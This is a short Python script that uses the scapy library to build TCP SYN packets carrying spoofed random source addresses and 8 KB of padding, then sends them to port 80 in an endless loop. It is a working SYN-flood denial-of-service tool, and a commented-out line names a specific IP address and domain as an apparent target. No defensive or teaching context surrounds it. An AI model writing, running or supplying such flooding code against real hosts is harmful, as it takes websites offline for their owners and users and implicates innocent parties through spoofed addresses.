import sys
sys.path.append("C:\\Users\\User\Documents\To The Distance\Python\Lib\site-packages\scapy")

from scapy.all import *

#ip = "216.59.16.123"
#www.metaeventos.net

def work(ip):
    syn_pkt = IP(dst=ip, src=RandIP()) / TCP(flags="S", dport=80, sport=RandShort()) / Raw(b"X" * 8192)
    print("Sending Packets ... ")

    send(syn_pkt, loop=1, verbose=False)


